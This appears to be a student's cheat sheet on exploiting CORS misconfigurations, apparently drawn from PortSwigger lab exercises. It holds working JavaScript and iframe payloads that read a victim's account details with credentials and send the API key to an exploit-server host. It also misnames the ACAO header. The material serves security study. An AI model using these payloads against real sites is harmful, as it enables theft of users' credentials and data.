# CORS

## Types:

1. Server-generated ACAO header from client-specified Origin header
2. Errors parsing Origin headers
3. Whitelisted null origin value
4. Exploiting XSS via CORS trust relationships
5. Breaking TLS with poorly configured CORS
6. Intranets and CORS without credentials 
---

## How to find each type:

1. Server-generated ACAO header from client-specified Origin header
- Attempt to use a random origin in the `Origin` header.
- See if the origin is reflected in the  `Access-Allow-Control-Origin` header.
2. Errors parsing Origin headers
- See if you can use subdomains or domains that end with the whitelisted domain.
3. Whitelisted null origin value
- Put `null` in the origin header and see if it is reflected.
4. Exploiting XSS via CORS trust relationships
- Check to see if subdomains are allowed in the `Access-Allow-Control-Origin` header.
- If they are, see if there is XSS on these domains.
5. Breaking TLS with poorly configured CORS
-
6. Intranets and CORS without credentials 
-
---

## How to exploit each type:

1. Server-generated ACAO header from client-specified Origin header
```js
  function getadmin() {
    var res = JSON.parse(this.response)
    fetch("https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?" + res.apikey);
}

const request = new XMLHttpRequest();
request.addEventListener("load", getadmin);
request.open("GET", "https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails", true);
request.withCredentials = true;
request.send();
```
2. Errors parsing Origin headers
- If `normal-website.com` is ok then try `hackersnormal-website.com`.
3. Whitelisted null origin value
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
var res = JSON.parse(this.response)
location = 'https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?' + res.apikey;
};
</script>"></iframe>
```
4. Exploiting XSS via CORS trust relationships
- Use XSS with the first CORS exploit:
  ```html
  <script>
    location="http://subdomain/?param=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a0f002004d241048007da1d006100c9.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {var res = JSON.parse(this.response); location='https://exploit-0a9c0056042b411d809bd96701ef00ae.exploit-server.net/accountDetails?key='%2bres.apikey;};</script>"
  </script>
  ```
5. Breaking TLS with poorly configured CORS
- This attack involves the following steps:
  - The victim user makes any plain HTTP request.
  - The attacker injects a redirection to: `http://trusted-subdomain.vulnerable-website.com`
  - The victim's browser follows the redirect.
  - The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: `https://vulnerable-website.com`
  - The victim's browser makes the CORS request, including the origin: `http://trusted-subdomain.vulnerable-website.com`
  - The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
  - The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
6. Intranets and CORS without credentials 
-
---

## Other important notes:
- Look for the `Access-Allow-Control-Origin` header.
